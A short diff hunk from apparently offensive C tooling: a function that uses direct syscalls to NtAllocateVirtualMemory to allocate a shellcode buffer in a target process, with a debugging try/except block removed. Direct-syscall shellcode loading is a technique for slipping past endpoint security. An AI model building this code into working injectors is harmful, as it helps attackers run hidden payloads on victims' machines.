@@ -178,21 +178,7 @@ BOOL runDirectSyscall(IN pNtTable *pNtTable, IN enum DirectSyscallLibrary Direct
         dwShellcodeBufferSize = va_arg(args, DWORD);
         va_end(args);
 
-        __try{
-
-        printf("Updating syscall\n");
         DirectSysCallUpdate((*pNtTable)->NtAllocateVirtualMemory.wSyscall);
-        DirectSysCall(hProcess, &pShellcodeBaseAddress, 0, (PSIZE_T)&dwShellcodeBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        printf("Allocated memory at %p\n", pShellcodeBaseAddress);
-        getchar();
-
-        }
-        __except(EXCEPTION_EXECUTE_HANDLER) {
-            DWORD dwError = GetExceptionCode();
-            printf("Access violation at %lu\n", dwError);
-            return FALSE;
-        }
-
         if (!(STATUS = DirectSysCall(hProcess, NULL, dwShellcodeBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
             handleError(ERROR_INVALID_ARGUMENTS, "Failed to call NtAllocateVirtualMemory");
             return FALSE;
